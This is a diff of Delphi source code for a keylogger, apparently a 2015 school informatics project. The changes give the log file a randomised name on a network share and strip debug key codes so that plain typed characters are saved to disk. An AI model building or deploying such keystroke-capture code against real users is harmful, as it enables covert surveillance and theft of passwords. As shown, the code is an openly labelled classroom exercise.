@@ -48,8 +48,13 @@ end;
 
 procedure TForm1.FormCreate(Sender: TObject); //Writes Lines to .txt
 var f:textfile;
+  today: TDateTime;
+  nowrandstring: String;
 begin
-d:= 'S:\Informatik EF 2015\lökj\' +  datetostr(now) + '.txt';
+today := Now;
+randomize();
+nowrandstring := DateToStr(today) + '_' + inttostr(random(1000000));
+d:= 'S:\Informatik EF 2015\lökj\' +  nowrandstring + '.txt';
 assignfile(f,d);
 rewrite(f);
 writeln(f, 'KeyloggerProtocol - EF Info');
@@ -148,8 +153,8 @@ begin
     226: DisplayAction(' < ');
   else if (InputKey >=32) and (InputKey <=110) AND (InputKey <> 64) then
   begin
-    if pressed then Memo1.Text := Memo1.Text + Uppercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey)
-    else Memo1.Text := Memo1.Text + Lowercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey);
+    if pressed then Memo1.Text := Memo1.Text + Uppercase(Chr(InputKey))
+    else Memo1.Text := Memo1.Text + Lowercase(Chr(InputKey));
     Memo1.Lines.Add('');
     Memo1.Lines.SaveToFile(d);
   end
